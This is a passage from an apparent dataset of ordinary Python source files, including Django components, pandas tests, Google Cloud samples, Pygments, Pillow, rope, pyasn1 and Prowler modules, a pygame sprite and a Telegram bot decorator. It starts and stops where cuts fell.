        home: HomeInfo,
        data: dict
    ) -> None:
        super().__init__(session, home, data, DeviceType.OUTLET, DeviceTypeId.OUTLET)"
JD275	JD275-fallback.py	"from django.contrib.messages.storage.base import BaseStorage
from django.contrib.messages.storage.cookie import CookieStorage
from django.contrib.messages.storage.session import SessionStorage


class FallbackStorage(BaseStorage):
    """"""
    Try to store all messages in the first backend. Store any unstored
    messages in each subsequent backend.
    """"""

    storage_classes = (CookieStorage, SessionStorage)

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.storages = [
            storage_class(*args, **kwargs) for storage_class in self.storage_classes
        ]
        self._used_storages = set()

    def _get(self, *args, **kwargs):
        """"""
        Get a single list of messages from all storage backends.
        """"""
        all_messages = []
        for storage in self.storages:
            messages, all_retrieved = storage._get()
            # If the backend hasn't been used, no more retrieval is necessary.
            if messages is None:
                break
            if messages:
                self._used_storages.add(storage)
            all_messages.extend(messages)
            # If this storage class contained all the messages, no further
            # retrieval is necessary
            if all_retrieved:
                break
        return all_messages, all_retrieved

    def _store(self, messages, response, *args, **kwargs):
        """"""
        Store the messages and return any unstored messages after trying all
        backends.

        For each storage backend, any messages not stored are passed on to the
        next backend.
        """"""
        for storage in self.storages:
            if messages:
                messages = storage._store(messages, response, remove_oldest=False)
            # Even if there are no more messages, continue iterating to ensure
            # storages which contained messages are flushed.
            elif storage in self._used_storages:
                storage._store([], response)
                self._used_storages.remove(storage)
        return messages"
JD324	JD324-job_search_autocomplete_job_title.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START job_search_autocomplete_job_title]

from google.cloud import talent_v4beta1
import six


def complete_query(project_id, tenant_id, query):
    """"""Complete job title given partial text (autocomplete)""""""

    client = talent_v4beta1.CompletionClient()

    # project_id = 'Your Google Cloud Project ID'
    # tenant_id = 'Your Tenant ID (using tenancy is optional)'
    # query = '[partially typed job title]'

    if isinstance(project_id, six.binary_type):
        project_id = project_id.decode(""utf-8"")
    if isinstance(tenant_id, six.binary_type):
        tenant_id = tenant_id.decode(""utf-8"")
    if isinstance(query, six.binary_type):
        query = query.decode(""utf-8"")

    parent = f""projects/{project_id}/tenants/{tenant_id}""

    request = talent_v4beta1.CompleteQueryRequest(
        parent=parent,
        query=query,
        page_size=5,  # limit for number of results
        language_codes=[""en-US""],  # language code
    )
    response = client.complete_query(request=request)
    for result in response.completion_results:
        print(f""Suggested title: {result.suggestion}"")
        # Suggestion type is JOB_TITLE or COMPANY_TITLE
        print(
            f""Suggestion type: {talent_v4beta1.CompleteQueryRequest.CompletionType(result.type_).name}""
        )


# [END job_search_autocomplete_job_title]"
JY552	JY552-test_delitem.py	"import pytest

from pandas import (
    Index,
    Series,
    date_range,
)
import pandas._testing as tm


class TestSeriesDelItem:
    def test_delitem(self):
        # GH#5542
        # should delete the item inplace
        s = Series(range(5))
        del s[0]

        expected = Series(range(1, 5), index=range(1, 5))
        tm.assert_series_equal(s, expected)

        del s[1]
        expected = Series(range(2, 5), index=range(2, 5))
        tm.assert_series_equal(s, expected)

        # only 1 left, del, add, del
        s = Series(1)
        del s[0]
        tm.assert_series_equal(s, Series(dtype=""int64"", index=Index([], dtype=""int64"")))
        s[0] = 1
        tm.assert_series_equal(s, Series(1))
        del s[0]
        tm.assert_series_equal(s, Series(dtype=""int64"", index=Index([], dtype=""int64"")))

    def test_delitem_object_index(self):
        # Index(dtype=object)
        s = Series(1, index=[""a""])
        del s[""a""]
        tm.assert_series_equal(
            s, Series(dtype=""int64"", index=Index([], dtype=""object""))
        )
        s[""a""] = 1
        tm.assert_series_equal(s, Series(1, index=[""a""]))
        del s[""a""]
        tm.assert_series_equal(
            s, Series(dtype=""int64"", index=Index([], dtype=""object""))
        )

    def test_delitem_missing_key(self):
        # empty
        s = Series(dtype=object)

        with pytest.raises(KeyError, match=r""^0$""):
            del s[0]

    def test_delitem_extension_dtype(self):
        # GH#40386
        # DatetimeTZDtype
        dti = date_range(""2016-01-01"", periods=3, tz=""US/Pacific"")
        ser = Series(dti)

        expected = ser[[0, 2]]
        del ser[1]
        assert ser.dtype == dti.dtype
        tm.assert_series_equal(ser, expected)

        # PeriodDtype
        pi = dti.tz_localize(None).to_period(""D"")
        ser = Series(pi)

        expected = ser[:2]
        del ser[2]
        assert ser.dtype == pi.dtype
        tm.assert_series_equal(ser, expected)"
JD302	JD302-managers.py	"from django.conf import settings
from django.core import checks
from django.core.exceptions import FieldDoesNotExist
from django.db import models


class CurrentSiteManager(models.Manager):
    ""Use this to limit objects to those associated with the current site.""

    use_in_migrations = True

    def __init__(self, field_name=None):
        super().__init__()
        self.__field_name = field_name

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        errors.extend(self._check_field_name())
        return errors

    def _check_field_name(self):
        field_name = self._get_field_name()
        try:
            field = self.model._meta.get_field(field_name)
        except FieldDoesNotExist:
            return [
                checks.Error(
                    ""CurrentSiteManager could not find a field named '%s'.""
                    % field_name,
                    obj=self,
                    id=""sites.E001"",
                )
            ]

        if not field.many_to_many and not isinstance(field, (models.ForeignKey)):
            return [
                checks.Error(
                    ""CurrentSiteManager cannot use '%s.%s' as it is not a foreign key ""
                    ""or a many-to-many field.""
                    % (self.model._meta.object_name, field_name),
                    obj=self,
                    id=""sites.E002"",
                )
            ]

        return []

    def _get_field_name(self):
        """"""Return self.__field_name or 'site' or 'sites'.""""""

        if not self.__field_name:
            try:
                self.model._meta.get_field(""site"")
            except FieldDoesNotExist:
                self.__field_name = ""sites""
            else:
                self.__field_name = ""site""
        return self.__field_name

    def get_queryset(self):
        return (
            super()
            .get_queryset()
            .filter(**{self._get_field_name() + ""__id"": settings.SITE_ID})
        )"
JD414	JD414-language.py	"from strings import get_string
from ShizukaXMusic.misc import SUDOERS
from ShizukaXMusic.utils.database import get_lang, is_commanddelete_on, is_maintenance


def language(mystic):
    async def wrapper(_, message, **kwargs):
        if await is_maintenance() is False:
            if message.from_user.id not in SUDOERS:
                return await message.reply_text(
                    ""» ʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ғᴏʀ sᴏᴍᴇ ᴛɪᴍᴇ, ᴩʟᴇᴀsᴇ ᴠɪsɪᴛ sᴜᴩᴩᴏʀᴛ ᴄʜᴀᴛ ᴛᴏ ᴋɴᴏᴡ ᴛʜᴇ ʀᴇᴀsᴏɴ.""
                )
        if await is_commanddelete_on(message.chat.id):
            try:
                await message.delete()
            except:
                pass
        try:
            language = await get_lang(message.chat.id)
            language = get_string(language)
        except:
            language = get_string(""en"")
        return await mystic(_, message, language)

    return wrapper


def languageCB(mystic):
    async def wrapper(_, CallbackQuery, **kwargs):
        if await is_maintenance() is False:
            if CallbackQuery.from_user.id not in SUDOERS:
                return await CallbackQuery.answer(
                    ""» ʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ғᴏʀ sᴏᴍᴇ ᴛɪᴍᴇ, ᴩʟᴇᴀsᴇ ᴠɪsɪᴛ sᴜᴩᴩᴏʀᴛ ᴄʜᴀᴛ ᴛᴏ ᴋɴᴏᴡ ᴛʜᴇ ʀᴇᴀsᴏɴ."",
                    show_alert=True,
                )
        try:
            language = await get_lang(CallbackQuery.message.chat.id)
            language = get_string(language)
        except:
            language = get_string(""en"")
        return await mystic(_, CallbackQuery, language)

    return wrapper


def LanguageStart(mystic):
    async def wrapper(_, message, **kwargs):
        try:
            language = await get_lang(message.chat.id)
            language = get_string(language)
        except:
            language = get_string(""en"")
        return await mystic(_, message, language)

    return wrapper"
JY459	JY459-test_tz_localize.py	"import numpy as np
import pytest

from pandas import (
    DataFrame,
    Series,
    date_range,
)
import pandas._testing as tm


class TestTZLocalize:
    # See also:
    # test_tz_convert_and_localize in test_tz_convert

    def test_tz_localize(self, frame_or_series):
        rng = date_range(""1/1/2011"", periods=100, freq=""H"")

        obj = DataFrame({""a"": 1}, index=rng)
        obj = tm.get_obj(obj, frame_or_series)

        result = obj.tz_localize(""utc"")
        expected = DataFrame({""a"": 1}, rng.tz_localize(""UTC""))
        expected = tm.get_obj(expected, frame_or_series)

        assert result.index.tz.zone == ""UTC""
        tm.assert_equal(result, expected)

    def test_tz_localize_axis1(self):
        rng = date_range(""1/1/2011"", periods=100, freq=""H"")

        df = DataFrame({""a"": 1}, index=rng)

        df = df.T
        result = df.tz_localize(""utc"", axis=1)
        assert result.columns.tz.zone == ""UTC""

        expected = DataFrame({""a"": 1}, rng.tz_localize(""UTC""))

        tm.assert_frame_equal(result, expected.T)

    def test_tz_localize_naive(self, frame_or_series):

        # Can't localize if already tz-aware
        rng = date_range(""1/1/2011"", periods=100, freq=""H"", tz=""utc"")
        ts = Series(1, index=rng)
        ts = frame_or_series(ts)

        with pytest.raises(TypeError, match=""Already tz-aware""):
            ts.tz_localize(""US/Eastern"")

    @pytest.mark.parametrize(""copy"", [True, False])
    def test_tz_localize_copy_inplace_mutate(self, copy, frame_or_series):
        # GH#6326
        obj = frame_or_series(
            np.arange(0, 5), index=date_range(""20131027"", periods=5, freq=""1H"", tz=None)
        )
        orig = obj.copy()
        result = obj.tz_localize(""UTC"", copy=copy)
        expected = frame_or_series(
            np.arange(0, 5),
            index=date_range(""20131027"", periods=5, freq=""1H"", tz=""UTC""),
        )
        tm.assert_equal(result, expected)
        tm.assert_equal(obj, orig)
        assert result.index is not obj.index
        assert result is not obj"
JY557	JY557-target.py	"import pygame
from pygame.sprite import Sprite


class Target(Sprite):
    """"""Класс для управления снарядами, выпущенными кораблём.""""""

    def __init__(self, ai_game):
        """"""Создает объект мишеней.""""""
        super().__init__()
        self.screen = ai_game.screen
        self.settings = ai_game.settings
        self.color = self.settings.target_color

        # Создание мишени в позиции (0, 0) и назначение правильной позиции.
        self.rect = pygame.Rect(self.settings.screen_width - self.settings.target_width - 10,
                                10, self.settings.target_width,
                                self.settings.target_height)

        # Позиция мишени хранится в вещественном формате.
        self.y = float(self.rect.y)

    def check_edges(self):
        """"""Возвращает True, если пришелец находится у края экрана.""""""
        screen_rect = self.screen.get_rect()
        if self.rect.top <= 0 or self.rect.bottom >= screen_rect.bottom:
            return True

    def update(self):
        """"""Перемещает снаряд вверх по экрану.""""""
        # Обновление позиции мишени в вещественном формате.
        self.y += (self.settings.target_speed *
                        self.settings.target_direction)
        # Обновление позиции прямоугольника.
        self.rect.y = self.y

    def place_reset(self):
        """"""Возвращает мишень на начальное место.""""""
        self.rect.x = self.settings.screen_width - self.settings.target_width - 10
        self.rect.y = 10
        self.y = float(self.rect.y)

    def draw_target(self):
        """"""Вывод снаряда на экран.""""""
        pygame.draw.rect(self.screen, self.color, self.rect)"
JD326	JD326-update_secret_with_etag.py	"#!/usr/bin/env python

# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and

import argparse


# [START secretmanager_update_secret_with_etag]
def update_secret_with_etag(project_id, secret_id, etag):
    """"""
    Update the metadata about an existing secret, using etag.
    """"""

    # Import the Secret Manager client library.
    from google.cloud import secretmanager

    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret.
    name = client.secret_path(project_id, secret_id)

    # Update the secret.
    secret = {""name"": name, ""labels"": {""secretmanager"": ""rocks""}, ""etag"": etag}
    update_mask = {""paths"": [""labels""]}
    response = client.update_secret(
        request={""secret"": secret, ""update_mask"": update_mask}
    )

    # Print the new secret name.
    print(""Updated secret: {}"".format(response.name))
    # [END secretmanager_update_secret_with_etag]

    return response


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(""project_id"", help=""id of the GCP project"")
    parser.add_argument(""secret-id"", required=True)
    parser.add_argument(""etag"", help=""current etag of the secret"")
    args = parser.parse_args()

    update_secret_with_etag(args.project_id, args.secret_id, args.etag)"
JY40	JY40-ga_rpn_r50_caffe_fpn_1x_coco.py	"_base_ = '../rpn/rpn_r50_caffe_fpn_1x_coco.py'
model = dict(
    rpn_head=dict(
        _delete_=True,
        type='GARPNHead',
        in_channels=256,
        feat_channels=256,
        approx_anchor_generator=dict(
            type='AnchorGenerator',
            octave_base_scale=8,
            scales_per_octave=3,
            ratios=[0.5, 1.0, 2.0],
            strides=[4, 8, 16, 32, 64]),
        square_anchor_generator=dict(
            type='AnchorGenerator',
            ratios=[1.0],
            scales=[8],
            strides=[4, 8, 16, 32, 64]),
        anchor_coder=dict(
            type='DeltaXYWHBBoxCoder',
            target_means=[.0, .0, .0, .0],
            target_stds=[0.07, 0.07, 0.14, 0.14]),
        bbox_coder=dict(
            type='DeltaXYWHBBoxCoder',
            target_means=[.0, .0, .0, .0],
            target_stds=[0.07, 0.07, 0.11, 0.11]),
        loc_filter_thr=0.01,
        loss_loc=dict(
            type='FocalLoss',
            use_sigmoid=True,
            gamma=2.0,
            alpha=0.25,
            loss_weight=1.0),
        loss_shape=dict(type='BoundedIoULoss', beta=0.2, loss_weight=1.0),
        loss_cls=dict(
            type='CrossEntropyLoss', use_sigmoid=True, loss_weight=1.0),
        loss_bbox=dict(type='SmoothL1Loss', beta=1.0, loss_weight=1.0)),
    # model training and testing settings
    train_cfg=dict(
        rpn=dict(
            ga_assigner=dict(
                type='ApproxMaxIoUAssigner',
                pos_iou_thr=0.7,
                neg_iou_thr=0.3,
                min_pos_iou=0.3,
                ignore_iof_thr=-1),
            ga_sampler=dict(
                type='RandomSampler',
                num=256,
                pos_fraction=0.5,
                neg_pos_ub=-1,
                add_gt_as_proposals=False),
            allowed_border=-1,
            center_ratio=0.2,
            ignore_ratio=0.5)),
    test_cfg=dict(rpn=dict(nms_post=1000)))
optimizer_config = dict(
    _delete_=True, grad_clip=dict(max_norm=35, norm_type=2))"
JD196	JD196-pangomarkup.py	"""""""
    pygments.formatters.pangomarkup
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Formatter for Pango markup output.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.formatter import Formatter


__all__ = ['PangoMarkupFormatter']


_escape_table = {
    ord('&'): '&amp;',
    ord('<'): '&lt;',
}


def escape_special_chars(text, table=_escape_table):
    """"""Escape & and < for Pango Markup.""""""
    return text.translate(table)


class PangoMarkupFormatter(Formatter):
    """"""
    Format tokens as Pango Markup code. It can then be rendered to an SVG.

    .. versionadded:: 2.9
    """"""

    name = 'Pango Markup'
    aliases = ['pango', 'pangomarkup']
    filenames = []

    def __init__(self, **options):
        Formatter.__init__(self, **options)

        self.styles = {}

        for token, style in self.style:
            start = ''
            end = ''
            if style['color']:
                start += '<span fgcolor=""#%s"">' % style['color']
                end = '</span>' + end
            if style['bold']:
                start += '<b>'
                end = '</b>' + end
            if style['italic']:
                start += '<i>'
                end = '</i>' + end
            if style['underline']:
                start += '<u>'
                end = '</u>' + end
            self.styles[token] = (start, end)

    def format_unencoded(self, tokensource, outfile):
        lastval = ''
        lasttype = None

        outfile.write('<tt>')

        for ttype, value in tokensource:
            while ttype not in self.styles:
                ttype = ttype.parent
            if ttype == lasttype:
                lastval += escape_special_chars(value)
            else:
                if lastval:
                    stylebegin, styleend = self.styles[lasttype]
                    outfile.write(stylebegin + lastval + styleend)
                lastval = escape_special_chars(value)
                lasttype = ttype

        if lastval:
            stylebegin, styleend = self.styles[lasttype]
            outfile.write(stylebegin + lastval + styleend)

        outfile.write('</tt>')"
JD308	JD308-vision_async_batch_annotate_images_test.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import uuid

from google.cloud import storage
import pytest

import vision_async_batch_annotate_images

RESOURCES = os.path.join(os.path.dirname(__file__), ""resources"")
GCS_ROOT = ""gs://cloud-samples-data/vision/""

BUCKET = os.environ[""CLOUD_STORAGE_BUCKET""]
OUTPUT_PREFIX = ""TEST_OUTPUT_{}"".format(uuid.uuid4())
GCS_DESTINATION_URI = ""gs://{}/{}/"".format(BUCKET, OUTPUT_PREFIX)


@pytest.fixture()
def storage_client():
    yield storage.Client()


@pytest.fixture()
def bucket(storage_client):
    bucket = storage_client.get_bucket(BUCKET)

    try:
        for blob in bucket.list_blobs(prefix=OUTPUT_PREFIX):
            blob.delete()
    except Exception:
        pass

    yield bucket

    for blob in bucket.list_blobs(prefix=OUTPUT_PREFIX):
        blob.delete()


@pytest.mark.flaky(max_runs=3, min_passes=1)
def test_sample_asyn_batch_annotate_images(storage_client, bucket, capsys):
    input_image_uri = os.path.join(GCS_ROOT, ""label/wakeupcat.jpg"")

    vision_async_batch_annotate_images.sample_async_batch_annotate_images(
        input_image_uri=input_image_uri, output_uri=GCS_DESTINATION_URI
    )

    out, _ = capsys.readouterr()

    assert ""Output written to GCS"" in out
    assert len(list(bucket.list_blobs(prefix=OUTPUT_PREFIX))) > 0"
JY429	JY429-_compat.py	"import sys
import platform


__all__ = ['install', 'NullFinder', 'Protocol']


try:
    from typing import Protocol
except ImportError:  # pragma: no cover
    from typing_extensions import Protocol  # type: ignore


def install(cls):
    """"""
    Class decorator for installation on sys.meta_path.

    Adds the backport DistributionFinder to sys.meta_path and
    attempts to disable the finder functionality of the stdlib
    DistributionFinder.
    """"""
    sys.meta_path.append(cls())
    disable_stdlib_finder()
    return cls


def disable_stdlib_finder():
    """"""
    Give the backport primacy for discovering path-based distributions
    by monkey-patching the stdlib O_O.

    See #91 for more background for rationale on this sketchy
    behavior.
    """"""

    def matches(finder):
        return getattr(
            finder, '__module__', None
        ) == '_frozen_importlib_external' and hasattr(finder, 'find_distributions')

    for finder in filter(matches, sys.meta_path):  # pragma: nocover
        del finder.find_distributions


class NullFinder:
    """"""
    A ""Finder"" (aka ""MetaClassFinder"") that never finds any modules,
    but may find distributions.
    """"""

    @staticmethod
    def find_spec(*args, **kwargs):
        return None

    # In Python 2, the import system requires finders
    # to have a find_module() method, but this usage
    # is deprecated in Python 3 in favor of find_spec().
    # For the purposes of this finder (i.e. being present
    # on sys.meta_path but having no other import
    # system functionality), the two methods are identical.
    find_module = find_spec


def pypy_partial(val):
    """"""
    Adjust for variable stacklevel on partial under PyPy.

    Workaround for #327.
    """"""
    is_pypy = platform.python_implementation() == 'PyPy'
    return val + is_pypy"
JY128	JY128-__init__.py	"""""""
 This module houses ctypes interfaces for GDAL objects.  The following GDAL
 objects are supported:

 CoordTransform: Used for coordinate transformations from one spatial
  reference system to another.

 Driver: Wraps an OGR data source driver.

 DataSource: Wrapper for the OGR data source object, supports
  OGR-supported data sources.

 Envelope: A ctypes structure for bounding boxes (GDAL library
  not required).

 OGRGeometry: Object for accessing OGR Geometry functionality.

 OGRGeomType: A class for representing the different OGR Geometry
  types (GDAL library not required).

 SpatialReference: Represents OSR Spatial Reference objects.

 The GDAL library will be imported from the system path using the default
 library name for the current OS. The default library path may be overridden
 by setting `GDAL_LIBRARY_PATH` in your settings with the path to the GDAL C
 library on your system.
""""""
from django.contrib.gis.gdal.datasource import DataSource
from django.contrib.gis.gdal.driver import Driver
from django.contrib.gis.gdal.envelope import Envelope
from django.contrib.gis.gdal.error import GDALException, SRSException, check_err
from django.contrib.gis.gdal.geometries import OGRGeometry
from django.contrib.gis.gdal.geomtype import OGRGeomType
from django.contrib.gis.gdal.libgdal import (
    GDAL_VERSION,
    gdal_full_version,
    gdal_version,
)
from django.contrib.gis.gdal.raster.source import GDALRaster
from django.contrib.gis.gdal.srs import AxisOrder, CoordTransform, SpatialReference

__all__ = (
    ""AxisOrder"",
    ""Driver"",
    ""DataSource"",
    ""CoordTransform"",
    ""Envelope"",
    ""GDALException"",
    ""GDALRaster"",
    ""GDAL_VERSION"",
    ""OGRGeometry"",
    ""OGRGeomType"",
    ""SpatialReference"",
    ""SRSException"",
    ""check_err"",
    ""gdal_version"",
    ""gdal_full_version"",
)"
JY495	JY495-DcxImagePlugin.py	"#
# The Python Imaging Library.
# $Id$
#
# DCX file handling
#
# DCX is a container file format defined by Intel, commonly used
# for fax applications.  Each DCX file consists of a directory
# (a list of file offsets) followed by a set of (usually 1-bit)
# PCX files.
#
# History:
# 1995-09-09 fl   Created
# 1996-03-20 fl   Properly derived from PcxImageFile.
# 1998-07-15 fl   Renamed offset attribute to avoid name clash
# 2002-07-30 fl   Fixed file handling
#
# Copyright (c) 1997-98 by Secret Labs AB.
# Copyright (c) 1995-96 by Fredrik Lundh.
#
# See the README file for information on usage and redistribution.
#

from . import Image
from ._binary import i32le as i32
from .PcxImagePlugin import PcxImageFile

MAGIC = 0x3ADE68B1  # QUIZ: what's this value, then?


def _accept(prefix):
    return len(prefix) >= 4 and i32(prefix) == MAGIC


##
# Image plugin for the Intel DCX format.


class DcxImageFile(PcxImageFile):

    format = ""DCX""
    format_description = ""Intel DCX""
    _close_exclusive_fp_after_loading = False

    def _open(self):

        # Header
        s = self.fp.read(4)
        if not _accept(s):
            msg = ""not a DCX file""
            raise SyntaxError(msg)

        # Component directory
        self._offset = []
        for i in range(1024):
            offset = i32(self.fp.read(4))
            if not offset:
                break
            self._offset.append(offset)

        self._fp = self.fp
        self.frame = None
        self.n_frames = len(self._offset)
        self.is_animated = self.n_frames > 1
        self.seek(0)

    def seek(self, frame):
        if not self._seek_check(frame):
            return
        self.frame = frame
        self.fp = self._fp
        self.fp.seek(self._offset[frame])
        PcxImageFile._open(self)

    def tell(self):
        return self.frame


Image.register_open(DcxImageFile.format, DcxImageFile, _accept)

Image.register_extension(DcxImageFile.format, "".dcx"")"
JD82	JD82-localtofield.py	"from rope.base import evaluate, exceptions, pynames, worder
from rope.refactor.rename import Rename


class LocalToField:
    def __init__(self, project, resource, offset):
        self.project = project
        self.resource = resource
        self.offset = offset

    def get_changes(self):
        name = worder.get_name_at(self.resource, self.offset)
        this_pymodule = self.project.get_pymodule(self.resource)
        pyname = evaluate.eval_location(this_pymodule, self.offset)
        if not self._is_a_method_local(pyname):
            raise exceptions.RefactoringError(
                ""Convert local variable to field should be performed on ""
                ""a local variable of a method.""
            )

        pymodule, lineno = pyname.get_definition_location()
        function_scope = pymodule.get_scope().get_inner_scope_for_line(lineno)
        # Not checking redefinition
        # self._check_redefinition(name, function_scope)

        new_name = self._get_field_name(function_scope.pyobject, name)
        changes = Rename(self.project, self.resource, self.offset).get_changes(
            new_name, resources=[self.resource]
        )
        return changes

    def _check_redefinition(self, name, function_scope):
        class_scope = function_scope.parent
        if name in class_scope.pyobject:
            raise exceptions.RefactoringError(""The field %s already exists"" % name)

    def _get_field_name(self, pyfunction, name):
        self_name = pyfunction.get_param_names()[0]
        new_name = self_name + ""."" + name
        return new_name

    def _is_a_method_local(self, pyname):
        pymodule, lineno = pyname.get_definition_location()
        holding_scope = pymodule.get_scope().get_inner_scope_for_line(lineno)
        parent = holding_scope.parent
        return (
            isinstance(pyname, pynames.AssignedName)
            and pyname in holding_scope.get_names().values()
            and holding_scope.get_kind() == ""Function""
            and parent is not None
            and parent.get_kind() == ""Class""
        )"
JD345	JD345-compliance.py	"import sys

from prowler.lib.check.compliance_models import (
    Compliance_Base_Model,
    Compliance_Requirement,
)
from prowler.lib.logger import logger


def update_checks_metadata_with_compliance(
    bulk_compliance_frameworks: dict, bulk_checks_metadata: dict
):
    """"""Update the check metadata model with the compliance framework""""""
    try:
        for check in bulk_checks_metadata:
            check_compliance = []
            for framework in bulk_compliance_frameworks.values():
                for requirement in framework.Requirements:
                    compliance_requirements = []
                    if check in requirement.Checks:
                        # Create the Compliance_Requirement
                        requirement = Compliance_Requirement(
                            Id=requirement.Id,
                            Description=requirement.Description,
                            Attributes=requirement.Attributes,
                            Checks=requirement.Checks,
                        )
                        # For the check metadata we don't need the ""Checks"" key
                        delattr(requirement, ""Checks"")
                        # Include the requirment into the check's framework requirements
                        compliance_requirements.append(requirement)
                        # Create the Compliance_Model
                        compliance = Compliance_Base_Model(
                            Framework=framework.Framework,
                            Provider=framework.Provider,
                            Version=framework.Version,
                            Requirements=compliance_requirements,
                        )
                        # Include the compliance framework for the check
                        check_compliance.append(compliance)
            # Save it into the check's metadata
            bulk_checks_metadata[check].Compliance = check_compliance
        return bulk_checks_metadata
    except Exception as e:
        logger.critical(f""{e.__class__.__name__}[{e.__traceback__.tb_lineno}] -- {e}"")
        sys.exit()"
JD273	JD273-0001_initial.py	"from django.db import migrations, models


class Migration(migrations.Migration):
    dependencies = [
        (""sites"", ""0001_initial""),
    ]

    operations = [
        migrations.CreateModel(
            name=""Redirect"",
            fields=[
                (
                    ""id"",
                    models.AutoField(
                        verbose_name=""ID"",
                        serialize=False,
                        auto_created=True,
                        primary_key=True,
                    ),
                ),
                (
                    ""site"",
                    models.ForeignKey(
                        to=""sites.Site"",
                        on_delete=models.CASCADE,
                        verbose_name=""site"",
                    ),
                ),
                (
                    ""old_path"",
                    models.CharField(
                        help_text=(
                            ""This should be an absolute path, excluding the domain ""
                            ""name. Example: “/events/search/”.""
                        ),
                        max_length=200,
                        verbose_name=""redirect from"",
                        db_index=True,
                    ),
                ),
                (
                    ""new_path"",
                    models.CharField(
                        help_text=(
                            ""This can be either an absolute path (as above) or a full ""
                            ""URL starting with “http://”.""
                        ),
                        max_length=200,
                        verbose_name=""redirect to"",
                        blank=True,
                    ),
                ),
            ],
            options={
                ""ordering"": [""old_path""],
                ""unique_together"": {(""site"", ""old_path"")},
                ""db_table"": ""django_redirect"",
                ""verbose_name"": ""redirect"",
                ""verbose_name_plural"": ""redirects"",
            },
            bases=(models.Model,),
        ),
    ]"
JD75	JD75-rfc7508.py	"#
# This file is part of pyasn1-modules software.
#
# Created by Russ Housley with assistance from asn1ate v.0.6.0.
#
# Copyright (c) 2019, Vigil Security, LLC
# License: http://snmplabs.com/pyasn1/license.html
#
# Securing Header Fields with S/MIME
#
# ASN.1 source from:
# https://www.rfc-editor.org/rfc/rfc7508.txt
# https://www.rfc-editor.org/errata/eid5875
#

from pyasn1.type import char
from pyasn1.type import constraint
from pyasn1.type import namedtype
from pyasn1.type import namedval
from pyasn1.type import univ

from pyasn1_modules import rfc5652

import string

MAX = float('inf')


class Algorithm(univ.Enumerated):
    namedValues = namedval.NamedValues(
        ('canonAlgorithmSimple', 0),
        ('canonAlgorithmRelaxed', 1)
    )


class HeaderFieldStatus(univ.Integer):
    namedValues = namedval.NamedValues(
        ('duplicated', 0),
        ('deleted', 1),
        ('modified', 2)
    )


class HeaderFieldName(char.VisibleString):
    subtypeSpec = (
        constraint.PermittedAlphabetConstraint(*string.printable) -
        constraint.PermittedAlphabetConstraint(':')
    )


class HeaderFieldValue(char.UTF8String):
    pass


class HeaderField(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('field-Name', HeaderFieldName()),
        namedtype.NamedType('field-Value', HeaderFieldValue()),
        namedtype.DefaultedNamedType('field-Status',
            HeaderFieldStatus().subtype(value='duplicated'))
    )


class HeaderFields(univ.SequenceOf):
    componentType = HeaderField()
    subtypeSpec = constraint.ValueSizeConstraint(1, MAX)


class SecureHeaderFields(univ.Set):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('canonAlgorithm', Algorithm()),
        namedtype.NamedType('secHeaderFields', HeaderFields())
    )


id_aa = univ.ObjectIdentifier((1, 2, 840, 113549, 1, 9, 16, 2, ))

id_aa_secureHeaderFieldsIdentifier = id_aa + (55, )



# Map of Attribute Type OIDs to Attributes added to the
# ones that are in rfc5652.py

_cmsAttributesMapUpdate = {
    id_aa_secureHeaderFieldsIdentifier: SecureHeaderFields(),
}

rfc5652.cmsAttributesMap.update(_cmsAttributesMapUpdate)
"
JD242	JD242-test_indexing.py	"import re

import numpy as np
import pytest

import pandas as pd


class TestSetitemValidation:
    def _check_setitem_invalid(self, arr, invalid):
        msg = f""Invalid value '{str(invalid)}' for dtype {arr.dtype}""
        msg = re.escape(msg)
        with pytest.raises(TypeError, match=msg):
            arr[0] = invalid

        with pytest.raises(TypeError, match=msg):
            arr[:] = invalid

        with pytest.raises(TypeError, match=msg):
            arr[[0]] = invalid

        # FIXME: don't leave commented-out
        # with pytest.raises(TypeError):
        #    arr[[0]] = [invalid]

        # with pytest.raises(TypeError):
        #    arr[[0]] = np.array([invalid], dtype=object)

        # Series non-coercion, behavior subject to change
        ser = pd.Series(arr)
        with pytest.raises(TypeError, match=msg):
            ser[0] = invalid
            # TODO: so, so many other variants of this...

    _invalid_scalars = [
        1 + 2j,
        ""True"",
        ""1"",
        ""1.0"",
        pd.NaT,
        np.datetime64(""NaT""),
        np.timedelta64(""NaT""),
    ]

    @pytest.mark.parametrize(
        ""invalid"", _invalid_scalars + [1, 1.0, np.int64(1), np.float64(1)]
    )
    def test_setitem_validation_scalar_bool(self, invalid):
        arr = pd.array([True, False, None], dtype=""boolean"")
